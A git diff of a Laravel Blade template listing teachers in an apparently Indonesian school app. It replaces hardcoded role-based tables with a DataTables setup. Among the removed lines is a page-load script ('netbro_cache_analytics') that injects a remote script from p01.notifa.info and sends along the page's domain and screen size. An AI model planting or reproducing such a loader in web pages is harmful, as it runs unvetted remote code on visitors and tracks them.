@@ -37,188 +37,37 @@
   </div>
 </div>
 
-@if(Auth()->user()->hasRole('student'))
 <div class="row">
   <div class="col-lg-12">
     <div class="card">
       <div class="card-header"><i class="fa fa-table"></i> Data Exporting</div>
       <div class="card-body">
         <div class="table-responsive">
-          
-          <table id="" class="table table-bordered">
-            <thead>
-              <tr>
-                <th>NO</th>
-                <th>NO GTK</th>
-                <th>NAMA</th>
-                <th>Mata Pelajaran</th>
-                <th>Aksi</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td>1</td>
-                <td>16.17.004</td>
-                <td>Siti Robiah Adawiyah, S.Pd</td>
-                <td>PAB</td>
-                <td>
-                  <a href="{{ url('teacher/1') }}" type="button" class="btn btn-outline-primary waves-effect waves-light m-1"> <i class="zmdi zmdi-info-outline fa-lg"></i> Detail </a>
-                </td>
-              </tr>
-              <tr>
-                <td>2</td>
-                <td>16.17.004</td>
-                <td>Agus Sofian, SE</td>
-                <td>SI</td>
-                <td>
-                  <a href="{{ url('teacher/1') }}" type="button" class="btn btn-outline-primary waves-effect waves-light m-1"> <i class="zmdi zmdi-info-outline fa-lg"></i> Detail </a>
-                </td>
-              </tr>
-              <tr>
-                <td>3</td>
-                <td>16.17.005</td>
-                <td>Essa Amalia, S.Pd</td>
-                <td>Inggris</td>
-                <td>
-                  <a href="{{ url('teacher/1') }}" type="button" class="btn btn-outline-primary waves-effect waves-light m-1"> <i class="zmdi zmdi-info-outline fa-lg"></i> Detail </a>
-                </td>
-              </tr>
-
-            </tbody>
-
-          </table>
-
-        </div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-
-          @elseif(Auth()->user()->hasRole('teacher'))
-
-          <div class="row">
-            <div class="col-lg-12">
-              <div class="card">
-                <div class="card-header"><i class="fa fa-table"></i> Data Exporting</div>
-                <div class="card-body">
-                  <div class="table-responsive">
-                  
-          <table id="" class="table table-bordered">
-            <thead>
-              <tr>
-                <th>NO</th>
-                <th>NO GTK</th>
-                <th>NAMA</th>
-                <th>Mata Pelajaran</th>
-                <th>Aksi</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td>1</td>
-                <td>16.17.003</td>
-                <td>Siti Robiah Adawiyah, S.Pd</td>
-                <td>PAB</td>
-                <td>
-                  <a href="{{ url('teacher/1') }}" type="button" class="btn btn-outline-primary waves-effect waves-light m-1"> <i class="zmdi zmdi-info-outline fa-lg"></i> Detail </a>
-                </td>
-              </tr>
-              <tr>
-                <td>2</td>
-                <td>16.17.004</td>
-                <td>Agus Sofian, SE</td>
-                <td>SI</td>
-                <td>
-                  <a href="{{ url('teacher/1') }}" type="button" class="btn btn-outline-primary waves-effect waves-light m-1"> <i class="zmdi zmdi-info-outline fa-lg"></i> Detail </a>
-                </td>
-              </tr>
-              <tr>
-                <td>3</td>
-                <td>16.17.005</td>
-                <td>Essa Amalia, S.Pd</td>
-                <td>Inggris</td>
-                <td>
-                  <a href="{{ url('teacher/1') }}" type="button" class="btn btn-outline-primary waves-effect waves-light m-1"> <i class="zmdi zmdi-info-outline fa-lg"></i> Detail </a>
-                </td>
-              </tr>
-
-            </tbody>
-
-          </table>
-
-        </div>
-        </div>
-      </div>
-    </div>
-  </div>
-
+          @if(Auth()->user()->hasRole('admin'))
+          <div class="container" style="margin-bottom: 10px; margin-left: -5px; margin-top: -4px;">
+            <a href="{{URL::to('/teacher/create')}}" data-toggle="tooltip" data-placement="top" title="TAMBAH GURU" type="button" class="btn btn-outline-primary waves-effect waves-light m-1"> <i class="zmdi zmdi-plus fa-lg"></i> </a>
+          </div>
           @else
-          <div class="row">
-            <div class="col-lg-12">
-              <div class="card">
-                <div class="card-header"><i class="fa fa-table"></i> Data Exporting</div>
-                <div class="card-body">
-                  <div class="table-responsive">
-                  <div class="container" style="margin-bottom: 10px; margin-left: -5px; margin-top: -4px;">
-                    <a href="{{URL::to('/teachers/create')}}" data-toggle="tooltip" data-placement="top" title="TAMBAH GURU" type="button" class="btn btn-outline-primary waves-effect waves-light m-1"> <i class="zmdi zmdi-plus fa-lg"></i> </a>
-                    </div>
-          <table id="example" class="table table-bordered">
+          @endif
+          <table id="example" class="table table-bordered" style="width: 100%;">
             <thead>
               <tr>
                 <th>NO</th>
-                <th>NO GTK</th>
                 <th>NAMA</th>
-                <th>Mata Pelajaran</th>
-                <th>Aksi</th>
+                <th>NO GTK</th>
+                <th>STATUS</th>
+                <th>AKSI</th>
               </tr>
             </thead>
             <tbody>
-              <tr>
-                <td>1</td>
-                <td>16.17.003</td>
-                <td>Siti Robiah Adawiyah, S.Pd</td>
-                <td>PAB</td>
-                <td>
-                  <a href="{{ url('teacher/1') }}" data-toggle="tooltip" data-placement="top" title="DETAIL" type="button" class="btn btn-outline-primary waves-effect waves-light m-1"> <i class="zmdi zmdi-info-outline fa-lg"></i> </a>
-                  <a href="{{ url('/teachers/edit/1')}}" data-toggle="tooltip" data-placement="top" title="EDIT" type="button" class="btn btn-outline-success waves-effect waves-light m-1"> <i class="fa fa-edit fa-lg"></i> </a>
-                  <a href="{{ url('/teachers/delete/1')}}" type="button" data-toggle="tooltip" data-placement="top" title="DELETE" class="btn btn-outline-danger waves-effect waves-light m-1"> <i class="fa fa-trash fa-lg"></i> </a>
-                </td>
-              </tr>
-              <tr>
-                <td>2</td>
-                <td>16.17.004</td>
-                <td>Agus Sofian, SE</td>
-                <td>SI</td>
-                <td>
-                  <a href="{{ url('teacher/1') }}" type="button" data-toggle="tooltip" data-placement="top" title="DETAIL" class="btn btn-outline-primary waves-effect waves-light m-1"> <i class="zmdi zmdi-info-outline fa-lg"></i> </a>
-                  <a href="{{ url('/teachers/edit/1')}}" type="button" data-toggle="tooltip" data-placement="top" title="EDIT" class="btn btn-outline-success waves-effect waves-light m-1"> <i class="fa fa-edit fa-lg"></i> </a>
-                  <a href="{{ url('/teachers/delete/1')}}" type="button" data-toggle="tooltip" data-placement="top" title="DELETE" class="btn btn-outline-danger waves-effect waves-light m-1"> <i class="fa fa-trash fa-lg"></i> </a>
-                </td>
-              </tr>
-              <tr>
-                <td>3</td>
-                <td>16.17.005</td>
-                <td>Essa Amalia, S.Pd</td>
-                <td>Inggris</td>
-                <td>
-                  <a href="{{ url('teacher/1') }}" type="button" data-toggle="tooltip" data-placement="top" title="DETAIL" class="btn btn-outline-primary waves-effect waves-light m-1"> <i class="zmdi zmdi-info-outline fa-lg"></i> </a>
-                  <a href="{{ url('/teachers/edit/1')}}" type="button" data-toggle="tooltip" data-placement="top" title="EDIT" class="btn btn-outline-success waves-effect waves-light m-1"> <i class="fa fa-edit fa-lg"></i> </a>
-                  <a href="{{ url('/teachers/delete/1')}}" type="button" data-toggle="tooltip" data-placement="top" title="DELETE" class="btn btn-outline-danger waves-effect waves-light m-1"> <i class="fa fa-trash fa-lg"></i> </a>
-                </td>
-              </tr>
-
             </tbody>
-
           </table>
-          
 
-        </div>
         </div>
       </div>
     </div>
-  </div><!-- End Row-->
-@endif
+  </div>
+</div><!-- End Row-->
 
 <!--Start Back To Top Button-->
 <a href="javaScript:void();" class="back-to-top"><i class="fa fa-angle-double-up"></i> </a>
@@ -252,48 +101,11 @@
 <script src="{{ asset('assets/plugins/bootstrap-datatable/js/buttons.colVis.min.js') }}"></script>
 
 
+<script src="{{ asset('js_datatables/datatable.js') }}"></script>
 <script>
   $(document).ready(function() {
-    //Default data table
-    $('#default-datatable').DataTable();
-
-
-    var table = $('#example').DataTable({
-      lengthChange: false,
-      buttons: ['copy', 'excel', 'pdf', 'print', 'colvis']
-    });
-
-    table.buttons().container()
-      .appendTo('#example_wrapper .col-md-6:eq(0)');
-
+    teacher()
   });
-</script>
-
-<script type="text/javascript">
-  if (self == top) {
-    function netbro_cache_analytics(fn, callback) {
-      setTimeout(function() {
-        fn();
-        callback();
-      }, 0);
-    }
-
-    function sync(fn) {
-      fn();
-    }
-
-    function requestCfs() {
-      var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
-      var idc_glo_r = Math.floor(Math.random() * 99999999999);
-      var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuih2FzmamiVXBdP7rQdzhTxfpkFFtvOnyejVCSSPK6u9WcsNj8GrchwkcC0cuuN23MjWecopK9D18LKoyDfbiXPfrndpWGpPOH2fLRyh5tK5%2f2c9K0us8J%2bjf3vFsn4%2fTXFgzL766s1rvusNt%2f2awK9lOy4Vktosm3AYYGGLl5M3uaPFy1scuCQj%2f0TtP9KTGu%2baG8AY8xIwvJwZqBstW8mLUHXgBTl%2fCiejm4tW3R%2b8lXa%2bjlGl2mi3qy6h0ZR8W72goA0fM%2fheFCPwMRwWv3%2fgBJNpUwJ%2bH2t1mVHjs4ZpZ7goJxWRAK4PpOPCLgzKtOnJI%2fZInHhRwD94P7HZXLqHaKn2Dp3%2fdEJHkeaL4yuoeuu063ZBMPA0nAsB4sgvkCfWzi2EjFHA1gg77pOXVlnhhOP8kHZYxMQ4QoZOkHsqic6nVTUksRjQ3Mma4U0zDcidDMWZgPrAvo08lzOZJkkwlaTsMfMhGiEbCHIzyrFruRxowfltKRNMntpE19Ejg4%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
-      var bsa = document.createElement('script');
-      bsa.type = 'text/javascript';
-      bsa.async = true;
-      bsa.src = url;
-      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
-    }
-    netbro_cache_analytics(requestCfs, function() {});
-  };
 </script>
 @endpush
 @endsection
